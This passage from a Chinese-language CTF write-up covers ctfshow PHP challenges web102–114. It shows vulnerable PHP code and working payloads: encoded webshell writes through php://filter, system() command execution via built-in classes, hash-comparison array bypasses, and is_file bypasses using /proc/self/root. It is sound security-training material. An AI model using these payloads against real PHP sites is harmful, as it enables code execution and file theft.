class=\"line\">PD89YHRhYyAqYDs= //在进行hex编码</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959485268597941715944733d</span><br></pre></td></tr></table></figure>\n\n<p>这时我们发现 <code>3d</code>为等号</p>\n<p>即v1&#x3D;hex2bin  v2&#x3D;00504438395948526859794171594473  v3&#x3D;php:&#x2F;&#x2F;1.php</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:v1=hex2bin</span><br><span class=\"line\"></span><br><span class=\"line\">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n<p>太妙了！！</p>\n<h3 id=\"web103\"><a href=\"#web103\" class=\"headerlink\" title=\"web103\"></a>web103</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class=\"line\">        file_put_contents($v3,$str);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&#x27;Sorry&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>过滤的更加多了，用上一题的思路也能解出来，我换一个吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure>\n\n<p>转化为base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD89YGNhdCAqYDs</span><br></pre></td></tr></table></figure>\n\n<p>再转化为ascii的十六进制</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959474e6864434171594473</span><br></pre></td></tr></table></figure>\n\n<p>我们发现这个很巧妙的里面只有一个字母e，但这里可以将其当成科学计数法，</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web104\"><a href=\"#web104\" class=\"headerlink\" title=\"web104\"></a>web104</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>数组绕过，sha(a[])会返回null  而null&#x3D;&#x3D;null</p>\n<h3 id=\"web105\"><a href=\"#web105\" class=\"headerlink\" title=\"web105\"></a>web105</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$error=&#x27;你还想要flag嘛？&#x27;;</span><br><span class=\"line\">$suces=&#x27;既然你想要那给你吧！&#x27;;</span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;foreach($_POST as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;</span><br><span class=\"line\">die($suces); </span><br></pre></td></tr></table></figure>\n\n<p>这题其实第一做的时候挺懵逼的，后来仔细理清了一下思路，其实就是简单的变量覆盖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value; </span><br></pre></td></tr></table></figure>\n\n<p>这里将我们用GET方式传入的参数当成KEY，参数的值作为VALUE</p>\n<p>最后这里 <code>$$key=$$value;</code> 这里key不能等于error，于是</p>\n<p>我们传入 <code>suces=flag</code></p>\n<p>这样 <code>$suces=$flag</code>这里我们成功将flag的值传给了suces，接下来我们再将seces的值传给error</p>\n<p>同理，我们用post方式传入 <code>error=suces</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$errot=$suces=$flag</span><br></pre></td></tr></table></figure>\n\n<p>最后由于不成立</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error); </span><br></pre></td></tr></table></figure>\n\n<p>将error打印出来，此时error的值就是flag</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?suces=flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST:error=suces</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web106\"><a href=\"#web106\" class=\"headerlink\" title=\"web106\"></a>web106</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>数组绕过，这里不重复讲了。。</p>\n<h3 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">       parse_str($v1,$v2);</span><br><span class=\"line\">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class=\"line\">           echo $flag;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code></p>\n<blockquote>\n<p><strong>parse_str</strong> ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>\n<p>如果 <code>encoded_string</code> 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p>\n</blockquote>\n<p>这里我们传入v3&#x3D;flag</p>\n<p><code>v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</code>（其实就是flag经过md5后的值）</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3=flag</span><br><span class=\"line\">POST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</span><br></pre></td></tr></table></figure>\n\n<p>另一种思路 md5一个数组的值为null，如果v2这个数组中的flag值也为null，null&#x3D;&#x3D;null</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3[]=</span><br><span class=\"line\">POST:V1=</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web108\"><a href=\"#web108\" class=\"headerlink\" title=\"web108\"></a>web108</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class=\"line\">    die(&#x27;error&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//只有36d的人才能看到flag</span><br><span class=\"line\">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实这个题就考了一个知识点</p>\n<p>ereg函数可以用%00截断</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=a%00778</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class=\"line\">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>正则匹配要求v1和v2要包含字母。题目中eval里的语句，和之前web101有点相似。<br>初始化$v1，v1是个类，$v2()是参数。</p>\n<p>这道题用到了魔术方法__toString()，不少php的内置类里都包含有这个方法，如Reflectionclass、Exception、Error<br><code>__toString()</code>：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。</p>\n<blockquote>\n<p>PHP5.2.0之前，__toString() 方法只在使用 echo 或 print 时才生效。PHP5.2.0之后，可以在任何字符串环境生效</p>\n</blockquote>\n<p>所以echo使得<code>$v1</code>类触发<code>__toString()</code>，传递的参数v2会被输出。</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=CachingIterator&amp;v2=system(ls)</span><br><span class=\"line\">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>\n\n<p>回显fl36dga.txt</p>\n<p>访问url&#x2F;fl36dga.txt得到flag</p>\n<p>其实这里的<code>FilesystemIterator</code>没咋弄懂，还需要找师傅请教一下</p>\n<p>后续</p>\n<p>稍微懂了一点</p>\n<blockquote>\n<p>通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\techo getcwd().PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(getcwd());</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">输出为</span><br><span class=\"line\">D:\\PHP</span><br><span class=\"line\">  index.php</span><br><span class=\"line\">  index.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web111\"><a href=\"#web111\" class=\"headerlink\" title=\"web111\"></a>web111</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class=\"line\">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class=\"line\">            getFlag($v1,$v2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     </span><br></pre></td></tr></table></figure>\n\n<p>当v1传入ctfshow，执行getFlag函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br></pre></td></tr></table></figure>\n\n<p>也就是$ctfshow&#x3D;$$v2,然后将$$v1打印出来</p>\n<p>我们另<code>v2=GLOBALS</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web112\"><a href=\"#web112\" class=\"headerlink\" title=\"web112\"></a>web112</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&quot;hacker!&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>is_file</code></p>\n<blockquote>\n<p>判断给定文件名是否为一个正常的文件。</p>\n</blockquote>\n<p>is_file用php伪协议即可绕过</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这题过滤掉了filter，这个协议就用不了，这里增加一点知识点</p>\n<p><strong>linux里<code>/proc/self/root</code>是指向根目录的</strong></p>\n<p>也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容</p>\n<p>这里我们多次重复即可绕过<code>is_file</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n<p>另一种解法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n\n<p>应该是把flag.php当成压缩文件来读取，具体的不知道。</p>\n<h3 id=\"web114\"><a href=\"#web114\" class=\"headerlink\" title=\"web114\"></a>web114</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">echo 